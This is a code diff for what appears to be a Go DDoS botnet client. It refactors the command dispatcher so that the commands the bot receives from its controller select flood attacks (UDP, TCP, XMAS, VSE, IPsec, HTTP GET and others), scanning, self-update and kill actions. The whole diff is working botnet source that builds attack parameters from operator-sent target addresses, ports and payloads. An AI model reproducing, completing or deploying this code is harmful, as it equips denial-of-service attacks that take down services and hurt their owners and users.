@@ -146,10 +146,10 @@ func ComdSetup(args int, cut string) string {
 	return strings.Trim(Recv(*BotReader, args), cut)
 }
 
-func SetupCaller(input string) (Caller, bool) {
-	if input == "?tcp" {
+func SetupCaller() (Caller, bool) {
+	if ComdSetup(3, ":") == "?tcp" {
 		var CALL_5_ARG = map[string]Caller{
-			"?tcp": {
+			ComdSetup(3, ":"): {
 				CallAttack: &Attack{
 					flags:        Recv(*BotReader, 4),
 					srcAddr:      Recv(*BotReader, 5),
@@ -161,41 +161,11 @@ func SetupCaller(input string) (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_5_ARG[input]
+		value, key := CALL_5_ARG[ComdSetup(3, ":")]
 		return value, key
-	} else if input == "?udp" || input == "?saf" || input == "?paf" || input == "?xmas" {
+	} else if ComdSetup(3, ":") == "?udp" || ComdSetup(3, ":") == "?saf" || ComdSetup(3, ":") == "?paf" || ComdSetup(3, ":") == "?xmas" {
 		var CALL_4_ARG = map[string]Caller{
-			"?udp": {
-				CallAttack: &Attack{
-					srcAddr:      Recv(*BotReader, 4),
-					dstAddr:      Recv(*BotReader, 5),
-					dstPort:      Recv(*BotReader, 6),
-					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
-					attackSwitch: false,
-					reportSwitch: false,
-				},
-			},
-			"?saf": {
-				CallAttack: &Attack{
-					srcAddr:      Recv(*BotReader, 4),
-					dstAddr:      Recv(*BotReader, 5),
-					dstPort:      Recv(*BotReader, 6),
-					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
-					attackSwitch: false,
-					reportSwitch: false,
-				},
-			},
-			"?paf": {
-				CallAttack: &Attack{
-					srcAddr:      Recv(*BotReader, 4),
-					dstAddr:      Recv(*BotReader, 5),
-					dstPort:      Recv(*BotReader, 6),
-					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
-					attackSwitch: false,
-					reportSwitch: false,
-				},
-			},
-			"?xmas": {
+			ComdSetup(3, ":"): {
 				CallAttack: &Attack{
 					srcAddr:      Recv(*BotReader, 4),
 					dstAddr:      Recv(*BotReader, 5),
@@ -206,27 +176,11 @@ func SetupCaller(input string) (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_4_ARG[input]
+		value, key := CALL_4_ARG[ComdSetup(3, ":")]
 		return value, key
-	} else if input == "?vse" || input == "?fms" || input == "?ipsec" || input == "?scan" || input == "?update" {
+	} else if ComdSetup(3, ":") == "?vse" || ComdSetup(3, ":") == "?fms" || ComdSetup(3, ":") == "?ipsec" || ComdSetup(3, ":") == "?scan" || ComdSetup(3, ":") == "?update" {
 		var CALL_2_ARG = map[string]Caller{
-			"?vse": {
-				CallAttack: &Attack{
-					srcAddr:      Recv(*BotReader, 4),
-					dstAddr:      Recv(*BotReader, 5),
-					attackSwitch: false,
-					reportSwitch: false,
-				},
-			},
-			"?fms": {
-				CallAttack: &Attack{
-					srcAddr:      Recv(*BotReader, 4),
-					dstAddr:      Recv(*BotReader, 5),
-					attackSwitch: false,
-					reportSwitch: false,
-				},
-			},
-			"?ipsec": {
+			ComdSetup(3, ":"): {
 				CallAttack: &Attack{
 					srcAddr:      Recv(*BotReader, 4),
 					dstAddr:      Recv(*BotReader, 5),
@@ -248,18 +202,11 @@ func SetupCaller(input string) (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_2_ARG[input]
+		value, key := CALL_2_ARG[ComdSetup(3, ":")]
 		return value, key
-	} else if input == "?get" || input == "?poling" {
+	} else if ComdSetup(3, ":") == "?get" || ComdSetup(3, ":") == "?poling" {
 		var CALL_1_ARG = map[string]Caller{
-			"?get": {
-				CallAttack: &Attack{
-					url:          Recv(*BotReader, 4),
-					attackSwitch: false,
-					reportSwitch: false,
-				},
-			},
-			"?poling": {
+			ComdSetup(3, ":"): {
 				CallAttack: &Attack{
 					url:          Recv(*BotReader, 4),
 					attackSwitch: false,
@@ -267,15 +214,12 @@ func SetupCaller(input string) (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_1_ARG[input]
+		value, key := CALL_1_ARG[ComdSetup(3, ":")]
 		return value, key
-	} else if input == "?info" || input == "?kill" || input == "?stopddos" || input == "?stopscan" {
+	} else if ComdSetup(3, ":") == "?info" || ComdSetup(3, ":") == "?kill" || ComdSetup(3, ":") == "?stopddos" || ComdSetup(3, ":") == "?stopscan" {
 		var CALL_NON_ARG = map[string]Caller{
-			"?info": {
+			ComdSetup(3, ":"): {
 				CallBot: &Bot{},
-			},
-			"?kill": {
-				CallFunc: Kill,
 			},
 			"?stopddos": {
 				CallAttack: &Attack{
@@ -289,13 +233,13 @@ func SetupCaller(input string) (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_NON_ARG[input]
+		value, key := CALL_NON_ARG[ComdSetup(3, ":")]
 		return value, key
 	}
 	return Caller{}, false
 }
 
-func (b *Bot) ExecuteCaller(input string) (func(), bool) {
+func (b *Bot) ExecuteCaller() (func(), bool) {
 	var executesCallMap = map[string]func(){
 		"?udp":      b.UDP,
 		"?tcp":      b.TCP,
@@ -314,7 +258,7 @@ func (b *Bot) ExecuteCaller(input string) (func(), bool) {
 		"?stopddos": setAttackSwitch,
 		"?stopscan": setScanSwitch,
 	}
-	value, key := executesCallMap[input]
+	value, key := executesCallMap[ComdSetup(3, ":")]
 	return value, key
 }
 
